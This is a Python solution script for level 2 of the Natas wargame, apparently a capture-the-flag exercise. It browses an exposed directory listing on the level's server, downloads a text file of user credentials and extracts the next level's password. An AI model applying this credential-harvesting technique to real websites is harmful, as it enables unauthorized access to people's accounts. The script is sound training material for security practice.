import json
import re
import requests
from bs4 import BeautifulSoup

from natas_utils import *

LEVEL = 2
LEVEL_URL, LOGIN = load_level(LEVEL)

def main():
    response = requests.get(LEVEL_URL, auth=LOGIN)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    # print(soup.prettify())
    content = soup.find("div", {"id": "content"})
    # print(content.prettify())

    # image file lives in a subdirectory
    img_path = content.find("img").get("src")
    files_dir = '/'.join(img_path.split('/')[:-1])

    # list subdirectory and find a text file
    response = requests.get(f"{LEVEL_URL}/{files_dir}", auth=LOGIN)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    # print(soup.prettify())

    filename_elem = soup.find("a", attrs={"href": re.compile(r"\.txt$")}, recursive=True)
    users_file = filename_elem.text

    # get the file!
    response = requests.get(f"{LEVEL_URL}/{files_dir}/{users_file}", auth=LOGIN)
    response.raise_for_status()
    # print(response.text)

    natas3_password = None
    for line in response.text.split():
        split_line = line.split(':')
        if split_line[0] == "natas3":
            natas3_password = split_line[-1]

    if natas3_password:
        print("natas3:", natas3_password)
        store_level_password(LEVEL + 1, natas3_password)
    else:
        exit("failed to get natas3 password")

if __name__ == "__main__":
    main()